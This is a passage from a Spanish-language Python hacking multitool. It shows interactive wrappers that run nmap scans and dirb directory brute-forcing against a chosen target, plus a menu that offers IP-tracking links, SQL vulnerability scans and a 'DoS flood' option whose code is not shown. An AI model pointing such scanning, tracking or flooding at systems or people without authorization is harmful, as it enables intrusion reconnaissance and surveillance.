                            f.write(line)
                        print(f"{AZUL}Nota:{RESET} Se aÃ±adiÃ³ ~/bin a {profile}. Cierra y vuelve a abrir tu terminal para que se aplique.")
                    except Exception:
                        print(f"{ROJO}[!] No se pudo modificar {profile}. AÃ±ade manualmente: export PATH=\"$HOME/bin:$PATH\"{RESET}")
    except PermissionError:
        print(f"\n{ROJO}[!] Permiso denegado al intentar escribir en {chosen}.{RESET}")
        if system != "windows":
            print(f"{AZUL}Sugerencia:{RESET} Reintenta con permisos elevados:\n  sudo python3 {script_path}")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
        return
    except Exception as e:
        print(f"\n{ROJO}[!] OcurriÃ³ un error durante la instalaciÃ³n: {e}{RESET}")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
        return

    print(f"\n{VERDE}[+] InstalaciÃ³n finalizada. Ahora intenta ejecutar: {AZUL}Fh{RESET}")
    input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")

# --- NUEVA FUNCIÃ“N: Escaneo con nmap preguntando parÃ¡metros ---
def scan_with_nmap():
    target = input(f"{AZUL}[*] Ingresa la IP o dominio a escanear con nmap: {RESET}").strip()
    if not target:
        print(f"{ROJO}[!] Objetivo vacÃ­o. Cancelando.{RESET}")
        return

    # asegurar nmap (pkg apt o apt-get) - si no existe intenta instalar
    if not ensure_tool('nmap', pkg_name='nmap', pip_pkg=None):
        print(f"{ROJO}[!] nmap no disponible. InstÃ¡lalo manualmente o con el gestor de paquetes de tu sistema.{RESET}")
        return

    print("\nElige el tipo de escaneo:")
    print("  1) TCP SYN (-sS)")
    print("  2) TCP connect (-sT)")
    print("  3) UDP (-sU)")
    print("  4) RÃ¡pido (-F)")
    print("  5) Ninguno / personalizado")
    scan_type = input(f"{AZUL}OpciÃ³n [1-5] (enter=1): {RESET}").strip() or "1"
    flags = []
    if scan_type == "1":
        flags.append("-sS")
    elif scan_type == "2":
        flags.append("-sT")
    elif scan_type == "3":
        flags.append("-sU")
    elif scan_type == "4":
        flags.append("-F")
    elif scan_type == "5":
        pass
    else:
        print(f"{ROJO}OpciÃ³n no vÃ¡lida, usando -sS por defecto.{RESET}")
        flags.append("-sS")

    ports = input(f"{AZUL}Â¿Especificar puertos? (ej: 22,80,1-1024) [enter = ninguno]: {RESET}").strip()
    if ports:
        flags.extend(["-p", ports])

    sV = input(f"{AZUL}Detectar versiÃ³n de servicios (-sV)? [s/N]: {RESET}").strip().lower()
    if sV.startswith('s'):
        flags.append("-sV")

    do_O = input(f"{AZUL}DetecciÃ³n de SO (-O)? [s/N]: {RESET}").strip().lower()
    if do_O.startswith('s'):
        flags.append("-O")

    do_Pn = input(f"{AZUL}Omitir discovery/ping (-Pn)? [s/N]: {RESET}").strip().lower()
    if do_Pn.startswith('s'):
        flags.append("-Pn")

    print("\nVelocidad/timing (impacta detecciÃ³n y ruido):")
    print("  1) T0  2) T1  3) T2  4) T3 (default)  5) T4  6) T5")
    timing = input(f"{AZUL}Elige 1-6 (enter=4): {RESET}").strip() or "4"
    timing_map = {"1":"-T0","2":"-T1","3":"-T2","4":"-T3","5":"-T4","6":"-T5"}
    flags.append(timing_map.get(timing, "-T3"))

    extra = input(f"{AZUL}Opciones extra crudas (ej: --script vuln) [enter = none]: {RESET}").strip()
    extra_list = []
    if extra:
        try:
            extra_list = shlex.split(extra)
        except ValueError:
            print(f"{ROJO}Error al parsear opciones extra. Se ignorarÃ¡n.{RESET}")
            extra_list = []

    save_file = input(f"{AZUL}Guardar salida en archivo (ej: salida.txt) [enter = no]: {RESET}").strip()
    out_args = []
    if save_file:
        out_args = ["-oN", save_file]

    cmd = ["nmap"] + flags + extra_list + out_args + [target]
    print(f"\n{AZUL}Comando a ejecutar:{RESET} {' '.join(shlex.quote(x) for x in cmd)}")
    confirm = input(f"{AZUL}Â¿Ejecutar ahora? [s/N]: {RESET}").strip().lower()
    if not confirm.startswith('s'):
        print(f"{ROJO}Escaneo cancelado.{RESET}")
        return

    try:
        proc = subprocess.run(cmd, check=False)
        print(f"\n{VERDE}Escaneo finalizado. CÃ³digo de salida: {proc.returncode}{RESET}")
        if save_file:
            print(f"{VERDE}Salida guardada en: {save_file}{RESET}")
    except KeyboardInterrupt:
        print(f"\n{ROJO}Escaneo cancelado por usuario.{RESET}")
    except Exception as e:
        print(f"{ROJO}OcurriÃ³ un error al ejecutar nmap: {e}{RESET}")

# --- NUEVA FUNCIÃ“N: Escaneo con dirb preguntando parÃ¡metros ---
def scan_with_dirb():
    target = input(f"{AZUL}[*] Ingresa la URL o dominio a escanear con dirb (ej. http://example.com): {RESET}").strip()
    if not target:
        print(f"{ROJO}[!] Objetivo vacÃ­o. Cancelando.{RESET}")
        return

    # Asegurar dirb (intenta instalar si falta)
    if not ensure_tool('dirb', pkg_name='dirb', pip_pkg=None):
        print(f"{ROJO}[!] dirb no disponible. Intenta instalarlo manualmente (ej. sudo apt install dirb) o revisa repositorios.{RESET}")
        return

    wordlist = input(f"{AZUL}[*] Ruta a wordlist (ej: /usr/share/wordlists/dirb/common.txt) [enter = none]: {RESET}").strip()
    extra = input(f"{AZUL}[*] ParÃ¡metros extra para dirb (ej. -S -r) [enter = ninguno]: {RESET}").strip()
    cmd = ["dirb", target]
    if wordlist:
        cmd.append(wordlist)
    if extra:
        try:
            cmd.extend(shlex.split(extra))
        except Exception:
            cmd.extend(extra.split())

    print(f"\n{AZUL}Comando a ejecutar:{RESET} {' '.join(shlex.quote(x) for x in cmd)}")
    confirmar = input(f"{AZUL}Â¿Ejecutar dirb ahora? [s/N]: {RESET}").strip().lower()
    if not confirmar.startswith('s'):
        print(f"{ROJO}Escaneo dirb cancelado.{RESET}")
        return
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{ROJO}OcurriÃ³ un error al ejecutar dirb: {e}{RESET}")

# --- MenÃº principal ---
def show_menu():
    while True:
        print_banner()
        print(f"{VERDE}MenÃº de Opciones:{RESET}")
        print(f"1. {AZUL}Buscar usuario en redes sociales{RESET}")
        print(f"2. {AZUL}Buscar correo en sitios populares{RESET}")
        print(f"3. {AZUL}Rastrear direcciÃ³n IP{RESET}")
        print(f"4. {AZUL}Escanear vulnerabilidad SQL{RESET}")
        print(f"5. {AZUL}Generar enlace de rastreo de IP{RESET}")
        print(f"6. {AZUL}Realizar ataque de inundaciÃ³n (DoS) - SIMULACIÃ“N{RESET}")
        print(f"7. {AZUL}Obtener informaciÃ³n de un sitio web{RESET}")
        print(f"8. {AZUL}Instalar la herramienta (comando Fh){RESET}")
        print(f"9. {AZUL}Escanear con nmap{RESET}")
        print(f"10. {AZUL}Escanear con dirb{RESET}")
        print(f"11. {ROJO}Salir{RESET}")

        choice = input(f"\n{AZUL}Selecciona una opciÃ³n (1-11): {RESET}")

        if choice == '1':
            buscar_usuario()
        elif choice == '2':
            buscar_correo()
        elif choice == '3':
            track_ip()
        elif choice == '4':
            scan_vulnerability()
        elif choice == '5':
            get_ip_from_link()
        elif choice == '6':
            network_flood()
        elif choice == '7':
            get_website_info()
        elif choice == '8':
            install_tool()
        elif choice == '9':
            scan_with_nmap()
        elif choice == '10':
            scan_with_dirb()
        elif choice == '11':
            print(f"\n{VERDE}[+] Â¡Gracias por usar la herramienta!{RESET}")
            sys.exit()
        else:
            print(f"{ROJO}[!] OpciÃ³n invÃ¡lida. Intenta de nuevo.{RESET}")
        
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")

# --- Punto de Entrada Principal ---
if __name__ == "__main__":
    try:
        # Asegurar mÃ³dulos Python crÃ­ticos al inicio para evitar errores silenciosos
        if requests is None:
            requests = ensure_python_package('requests', 'requests')
        if dns is None:
            # dnspython proporciona dns.resolver
            dns = ensure_python_package('dnspython', 'dns')
        create_sites_file()
        show_menu()
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] InterrupciÃ³n por el usuario. Saliendo...{RESET}")
        sys.exit(1)

print(" ")
